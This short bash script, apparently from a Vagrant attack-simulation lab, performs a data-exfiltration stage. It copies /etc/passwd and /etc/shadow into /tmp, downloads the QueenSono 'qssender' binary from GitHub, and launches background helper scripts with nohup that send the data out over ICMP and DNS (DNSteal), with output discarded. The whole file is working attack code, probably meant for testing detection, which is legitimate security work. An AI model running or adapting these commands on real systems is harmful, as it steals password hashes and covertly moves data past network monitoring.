#!/bin/bash
# #[EXFILTRATION]

#Simulate collected files
mkdir /tmp/exfiltrate
cat /etc/passwd > /tmp/exfiltrate/passwd
cat /etc/shadow > /tmp/exfiltrate/shadow
# Run qssender to exfilrate via ICMP
wget https://github.com/ariary/QueenSono/releases/latest/download/qssender -O /tmp/qssender
chmod +x /tmp/qssender
cp /vagrant/attack/exfiltration/run_qssender.sh /tmp/run_qssender.sh
chmod +x /tmp/run_qssender.sh
nohup /tmp/run_qssender.sh &>/dev/null &
# Run DNSteal to exfiltrate via DNS
cp /vagrant/attack/exfiltration/run_dnsteal.sh /tmp/run_dnsteal.sh
chmod +x /tmp/run_dnsteal.sh
nohup /tmp/run_dnsteal.sh &>/dev/null &